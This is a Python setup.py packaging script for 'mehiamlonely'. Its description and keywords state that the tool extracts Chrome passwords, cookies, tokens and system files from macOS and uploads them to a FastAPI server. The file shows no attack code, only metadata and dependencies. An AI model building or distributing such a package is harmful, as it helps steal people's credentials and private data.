#!/usr/bin/env python3
"""
Setup script for mehiamlonely package
Allows installation directly from GitHub using: pip install git+https://github.com/username/repo.git
"""

from setuptools import setup, find_packages
import os
from pathlib import Path

# Read the README file
def read_readme():
    readme_path = Path(__file__).parent / "README.md"
    if readme_path.exists():
        return readme_path.read_text(encoding="utf-8")
    return "macOS File System and Chrome Data Extractor"

# Read requirements from pyproject.toml
def read_requirements():
    requirements = [
        "httpx",
        "cryptography", 
        "keyring",
        "pycryptodome",
        "aiofiles",
        "psutil",
    ]
    return requirements

# Get version from pyproject.toml or use default
def get_version():
    try:
        import tomllib
        pyproject_path = Path(__file__).parent / "pyproject.toml"
        if pyproject_path.exists():
            with open(pyproject_path, "rb") as f:
                data = tomllib.load(f)
                return data["project"]["version"]
    except ImportError:
        # Fallback for older Python versions
        try:
            import tomli
            pyproject_path = Path(__file__).parent / "pyproject.toml"
            if pyproject_path.exists():
                with open(pyproject_path, "rb") as f:
                    data = tomli.load(f)
                    return data["project"]["version"]
        except ImportError:
            pass
    return "0.1.0"

setup(
    name="mehiamlonely",
    version=get_version(),
    author="Your Name",
    author_email="your.email@example.com",
    description="macOS File System and Chrome Data Extractor - Extracts Chrome passwords, cookies, tokens, and system files, uploads to FastAPI server",
    long_description=read_readme(),
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/mehiamlonely",
    project_urls={
        "Bug Reports": "https://github.com/yourusername/mehiamlonely/issues",
        "Source": "https://github.com/yourusername/mehiamlonely",
        "Documentation": "https://github.com/yourusername/mehiamlonely#readme",
    },
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Operating System :: MacOS",
        "Programming Language :: Python :: 3",
        "Programming Language :: Python :: 3.8",
        "Programming Language :: Python :: 3.9",
        "Programming Language :: Python :: 3.10",
        "Programming Language :: Python :: 3.11",
        "Programming Language :: Python :: 3.12",
        "Topic :: Security",
        "Topic :: System :: Systems Administration",
        "Topic :: Utilities",
    ],
    python_requires=">=3.8",
    install_requires=read_requirements(),
    extras_require={
        "dev": [
            "pytest",
            "pytest-asyncio",
            "black",
            "flake8",
            "mypy",
        ],
    },
    entry_points={
        "console_scripts": [
            "mehiamlonely=mehiamlonely.cli:cli_main",
        ],
    },
    include_package_data=True,
    zip_safe=False,
    keywords="chrome, password, extraction, macos, security, data, filesystem",
)
